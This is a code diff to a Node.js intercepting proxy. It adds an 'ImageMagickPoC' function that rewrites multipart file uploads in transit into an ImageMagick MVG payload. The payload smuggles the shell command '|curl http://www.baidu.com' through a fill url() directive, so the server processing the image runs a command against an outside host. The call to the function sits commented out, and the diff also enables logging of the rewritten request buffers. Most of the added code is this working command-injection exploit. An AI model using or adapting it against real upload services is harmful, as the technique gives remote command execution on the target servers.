@@ -23,6 +23,29 @@ function buffer_find_body(b)
 	return -1;
 }
 
+function ImageMagickPoC(buf) {
+	var _body_pos = buffer_find_body(buf);
+	var _header = buf.slice(0,_body_pos);
+	var _body = buf.slice(_body_pos);
+
+	var _content_type = _header.toString('utf8').match(/Content-Type:.+/g)[0].split("=");
+	if(2>_content_type.length){
+		return ;
+	}
+	_file_body = _body.toString('utf8').split(_content_type[1]);
+	if(4>_file_body.length){
+		return ;
+	}
+	_new_body = _file_body[1] + "push graphic-context\r\nviewbox 0 0 640 480\r\nfill 'url(https://www.example.com/1.png \"|curl http://www.baidu.com\")'\r\npop graphic-context";
+	_new_content = _content_type[1]+'\r\n'+_new_body;
+	_new_content += '\r\n'+_content_type[1];
+	_new_content += '\r\n'+_file_body[2];
+	_new_content += '\r\n'+_content_type[1]+_file_body[3]+'\r\n';
+
+	//console.log(_new_content);
+	return _new_content;
+}
+
 net.createServer(function (client)
 {
 	
@@ -97,18 +120,12 @@ net.createServer(function (client)
 			var _buf_2 = buf.slice(_body_pos);
 			
 			//POST FILE
-			//console.log(_buf_1.toString('utf8'));
-			//var _content_type = _buf_1.toString('utf8').match(/Content-Type:.+/g)[0].split("=");
-			//_file_body = _buf_2.toString('utf8').split(_content_type[1]);	
-			//console.log("file body: "+_file_body.length+"==="+ _file_body[1]);
-			//_file_body[1] + "";
-			//console.log("content type: "+_content_type.length+"==="+_content_type[1]);
-			//console.log(_content_type);
+			//_image_magick_poc = ImageMagickPoC(buf);
 			var re = new Buffer(_buf_1.length + _buf_2.length);
 			_buf_1.copy(re);
 			_buf_2.copy(re,_buf_1.length);
 			buf = re;
-			//console.log("\r\nreplace buf:\r\n"+buf);
+			console.log("\r\nreplace buf:\r\n"+buf);
 		}
 		var server = net.createConnection(req.port,req.hostname);
 		server.on("data", function(data){ console.log("\r\nServer Data:\r\n"+data);client.write(data); });
